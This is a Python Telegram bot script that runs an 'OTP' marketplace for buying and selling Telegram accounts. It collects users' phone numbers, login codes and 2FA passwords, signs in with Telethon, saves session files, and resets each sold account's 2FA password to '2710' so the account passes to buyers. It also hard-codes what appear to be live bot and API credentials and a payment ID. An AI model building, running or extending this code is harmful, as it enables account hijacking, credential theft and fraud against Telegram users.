import telebot
from telebot import types
from telethon import TelegramClient, functions, types as tel_types
import asyncio
import os
import threading
from flask import Flask

# --- WEB SERVER ---
app = Flask('')
@app.route('/')
def home(): return "PRIME MASTER BOT LIVE"
def run(): app.run(host='0.0.0.0', port=8080)
threading.Thread(target=run, daemon=True).start()

# --- CONFIG ---
TOKEN = '8692935006:AAFGFN6aeecPubPdd821zq-CmQnZzMtySsw'
API_ID = 35155488
API_HASH = '9ee6b40363f94481d48dea8a3a871728'
OWNER_ID = 7634311488

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

db = {
    'users': {}, 
    'admins': [OWNER_ID], 
    'upi': 'abhay-op.315@ptyes',
    'stock': {}, 
    'sell_rates': {}, 
    'buy_rates': {},
}
active_logins = {}

if not os.path.exists('sessions'): os.makedirs('sessions')

# --- HELPERS ---
def is_admin(uid): return uid in db['admins'] or uid == OWNER_ID

def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('💰 BALANCE', '📥 DEPOSIT', '📤 SELL ID', '🛒 BUY ID', '📞 SUPPORT')
    return markup

# --- START (NO FORCE JOIN) ---
@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    if uid not in db['users']: db['users'][uid] = {'balance': 0}
    bot.send_message(message.chat.id, "🔥 **PRIME OTP BOT READY**\n\nWelcome back, Abhay!", reply_markup=main_menu())

# --- DEPOSIT SYSTEM (STEP-BY-STEP) ---
@bot.message_handler(func=lambda m: m.text == '📥 DEPOSIT')
def dep_start(message):
    msg = bot.send_message(message.chat.id, "💵 **Enter Amount to Deposit:**")
    bot.register_next_step_handler(msg, dep_utr_req)

def dep_utr_req(message):
    try:
        amt = int(message.text)
        msg = bot.send_message(message.chat.id, f"💳 **Pay to:** `{db['upi']}`\n\nSend your **12-digit UTR Number**:")
        bot.register_next_step_handler(msg, dep_screenshot_req, amt)
    except: bot.send_message(message.chat.id, "❌ Invalid Amount.")

def dep_screenshot_req(message, amt):
    utr = message.text.strip()
    if len(utr) != 12: return bot.send_message(message.chat.id, "❌ UTR must be 12 digits.")
    msg = bot.send_message(message.chat.id, "📸 Send **Payment Screenshot**:")
    bot.register_next_step_handler(msg, dep_final, amt, utr)

def dep_final(message, amt, utr):
    if message.content_type != 'photo': return bot.send_message(message.chat.id, "❌ Please send a photo.")
    uid = message.from_user.id
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ APPROVE", callback_data=f"da_{uid}_{amt}"), 
               types.InlineKeyboardButton("❌ REJECT", callback_data=f"dr_{uid}"))
    for a in db['admins']:
        bot.send_photo(a, message.photo[-1].file_id, caption=f"🔔 **DEP REQ**\nUser: `{uid}`\nAmt: ₹{amt}\nUTR: `{utr}`", reply_markup=markup)
    bot.send_message(message.chat.id, "⏳ Sent to admin for approval.")

# --- ADMIN PANEL & FEATURES ---
@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if not is_admin(message.from_user.id): return
    bot.send_message(message.chat.id, 
        "👑 **ADMIN CONTROL PANEL**\n\n"
        "🌍 `/addcountry COUNTRY BUY SELL` - Setup Country\n"
        "➕ `/addstock` - Login & Add ID to Stock\n"
        "👤 `/addadmin ID` - Make someone Admin\n"
        "📢 `/broadcast` - Message to all users\n"
        "💳 `/changeupi UPI_ID` - Update UPI\n"
        "📈 `/list` - Check Inventory")

@bot.message_handler(commands=['broadcast'])
def broadcast_start(message):
    if not is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, "📝 Enter message to broadcast:")
    bot.register_next_step_handler(msg, broadcast_process)

def broadcast_process(message):
    count = 0
    for user in db['users']:
        try:
            bot.send_message(user, message.text)
            count += 1
        except: pass
    bot.send_message(message.chat.id, f"✅ Sent to {count} users.")

@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    if message.from_user.id != OWNER_ID: return
    try:
        new_id = int(message.text.split()[1])
        if new_id not in db['admins']: db['admins'].append(new_id)
        bot.reply_to(message, f"✅ User {new_id} is now an Admin.")
    except: bot.reply_to(message, "Usage: `/addadmin ID`")

# --- ADD COUNTRY & STOCK (LOGIN FLOW) ---
@bot.message_handler(commands=['addcountry'])
def add_country_cmd(message):
    if not is_admin(message.from_user.id): return
    try:
        cmd = message.text.split()
        c, b_p, s_p = cmd[1].upper(), int(cmd[2]), int(cmd[3])
        db['buy_rates'][c], db['sell_rates'][c] = b_p, s_p
        if c not in db['stock']: db['stock'][c] = []
        bot.reply_to(message, f"✅ {c} added. Buy: {b_p}, Sell: {s_p}")
    except: bot.reply_to(message, "Usage: `/addcountry INDIA 40 25`")

@bot.message_handler(commands=['addstock'])
def admin_add_stock(message):
    if not is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, "🌍 Country Name:")
    bot.register_next_step_handler(msg, stock_country_step)

def stock_country_step(message):
    country = message.text.upper()
    if country not in db['stock']: return bot.send_message(message.chat.id, "❌ Add country first.")
    msg = bot.send_message(message.chat.id, f"📞 Enter {country} Number (+...):")
    bot.register_next_step_handler(msg, start_stock_login, country)

def start_stock_login(message, country):
    phone = message.text.strip()
    threading.Thread(target=stock_login_thread, args=(message.chat.id, phone, country)).start()

def stock_login_thread(chat_id, phone, country):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH, loop=loop)
    try:
        loop.run_until_complete(client.connect())
        req = loop.run_until_complete(client.send_code_request(phone))
        active_logins[chat_id] = {'client': client, 'phone': phone, 'hash': req.phone_code_hash, 'loop': loop, 'country': country}
        bot.send_message(chat_id, "📩 **OTP SENT!** Enter code:")
        bot.register_next_step_handler_by_chat_id(chat_id, verify_stock_otp)
    except Exception as e: bot.send_message(chat_id, f"❌ Error: {e}")

def verify_stock_otp(message):
    otp = message.text.strip()
    d = active_logins.get(message.chat.id)
    try:
        d['loop'].run_until_complete(d['client'].sign_in(d['phone'], otp, phone_code_hash=d['hash']))
        finalize_stock(message, d)
    except Exception as e:
        if "password" in str(e).lower():
            bot.send_message(message.chat.id, "🔐 Enter 2FA Password:")
            bot.register_next_step_handler_by_chat_id(message.chat.id, verify_stock_2fa)
        else: bot.send_message(message.chat.id, "❌ OTP Error.")

def verify_stock_2fa(message):
    pwd = message.text.strip()
    d = active_logins.get(message.chat.id)
    try:
        d['loop'].run_until_complete(d['client'].sign_in(password=pwd))
        finalize_stock(message, d, pwd)
    except: bot.send_message(message.chat.id, "❌ Wrong 2FA.")

def finalize_stock(message, d, pwd="No Password"):
    country = d['country']
    data = f"{d['phone']}:PASS:{pwd}"
    db['stock'][country].append(data)
    bot.send_message(message.chat.id, f"✅ **SUCCESS!** ID added to {country} stock.")

# --- SELL ID (AUTO 2FA 2710) ---
@bot.message_handler(func=lambda m: m.text == '📤 SELL ID')
def sell_menu(message):
    if not db['sell_rates']: return bot.send_message(message.chat.id, "❌ Disabled.")
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    for c in db['sell_rates']: markup.add(f"SELL {c}")
    bot.send_message(message.chat.id, "Select Country:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text.startswith('SELL '))
def sell_init(message):
    country = message.text.split()[1]
    msg = bot.send_message(message.chat.id, f"📞 Enter {country} Number:", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, start_sell_login, country)

def start_sell_login(message, country):
    phone = message.text.strip()
    threading.Thread(target=sell_login_thread, args=(message.chat.id, phone, country)).start()

def sell_login_thread(chat_id, phone, country):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH, loop=loop)
    try:
        loop.run_until_complete(client.connect())
        req = loop.run_until_complete(client.send_code_request(phone))
        active_logins[chat_id] = {'client': client, 'phone': phone, 'hash': req.phone_code_hash, 'loop': loop, 'country': country}
        bot.send_message(chat_id, "📩 **OTP SENT!** Enter code:")
        bot.register_next_step_handler_by_chat_id(chat_id, verify_sell_otp)
    except Exception as e: bot.send_message(chat_id, f"❌ Error: {e}")

def verify_sell_otp(message):
    otp = message.text.strip()
    d = active_logins.get(message.chat.id)
    try:
        d['loop'].run_until_complete(d['client'].sign_in(d['phone'], otp, phone_code_hash=d['hash']))
        finalize_sell(message, d)
    except Exception as e:
        if "password" in str(e).lower():
            bot.send_message(message.chat.id, "🔐 Enter Password:")
            bot.register_next_step_handler_by_chat_id(message.chat.id, verify_sell_2fa)
        else: bot.send_message(message.chat.id, "❌ OTP Error.")

def verify_sell_2fa(message):
    pwd = message.text.strip()
    d = active_logins.get(message.chat.id)
    try:
        d['loop'].run_until_complete(d['client'].sign_in(password=pwd))
        finalize_sell(message, d)
    except: bot.send_message(message.chat.id, "❌ Wrong 2FA.")

def finalize_sell(message, d):
    try:
        d['loop'].run_until_complete(d['client'](functions.account.UpdatePasswordSettingsRequest(
            new_settings=tel_types.account.PasswordInputSettings(new_password="2710", hint="dob")
        )))
    except: pass
    uid = message.from_user.id
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ APPROVE", callback_data=f"sa_{uid}_{d['country']}_{d['phone']}"))
    for a in db['admins']: bot.send_message(a, f"📦 **SELL REQ**\nUser: `{uid}`\nNum: `{d['phone']}`\n2FA: `2710`", reply_markup=markup)
    bot.send_message(message.chat.id, "✅ Success! Wait for payment.")

# --- CALLBACKS & BUY ---
@bot.callback_query_handler(func=lambda call: True)
def callbacks(call):
    p = call.data.split('_')
    if p[0] == 'da':
        uid, amt = int(p[1]), int(p[2])
        db['users'][uid]['balance'] += amt
        bot.send_message(uid, f"✅ ₹{amt} added!")
        bot.edit_message_caption("Approved ✅", call.message.chat.id, call.message.message_id)
    elif p[0] == 'sa':
        uid, country = int(p[1]), p[2]
        rate = db['sell_rates'].get(country, 0)
        db['users'][uid]['balance'] += rate
        bot.send_message(uid, f"✅ Sold! ₹{rate} added.")
        bot.edit_message_text("Paid ✅", call.message.chat.id, call.message.message_id)
    elif p[0] == 'buy':
        c, uid = p[1], call.from_user.id
        price = db['buy_rates'].get(c, 0)
        if db['users'].get(uid, {}).get('balance', 0) < price or not db['stock'].get(c):
            return bot.answer_callback_query(call.id, "Check stock/balance!", show_alert=True)
        data = db['stock'][c].pop(0)
        db['users'][uid]['balance'] -= price
        bot.send_message(uid, f"🛒 **BUY SUCCESS!**\n\n`{data}`")

@bot.message_handler(func=lambda m: m.text == '🛒 BUY ID')
def buy_menu_m(message):
    if not db['buy_rates']: return bot.send_message(message.chat.id, "❌ No stock.")
    markup = types.InlineKeyboardMarkup()
    for c, p in db['buy_rates'].items():
        markup.add(types.InlineKeyboardButton(f"{c} - ₹{p} ({len(db['stock'].get(c, []))})", callback_data=f"buy_{c}"))
    bot.send_message(message.chat.id, "Select country:", reply_markup=markup)

@bot.message_handler(func=lambda m: 'BALANCE' in m.text)
def bal(message):
    b = db['users'].get(message.from_user.id, {}).get('balance', 0)
    bot.send_message(message.chat.id, f"💳 Balance: ₹{b}")

@bot.message_handler(func=lambda m: 'SUPPORT' in m.text)
def sup(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("👤 OWNER", url="https://t.me/god_abhay"),
               types.InlineKeyboardButton("📢 SUPPORT GROUP", url="https://t.me/PRIME_OTP_SUPPORT_GROUP"))
    bot.send_message(message.chat.id, "Support Channels:", reply_markup=markup)

bot.polling(none_stop=True)
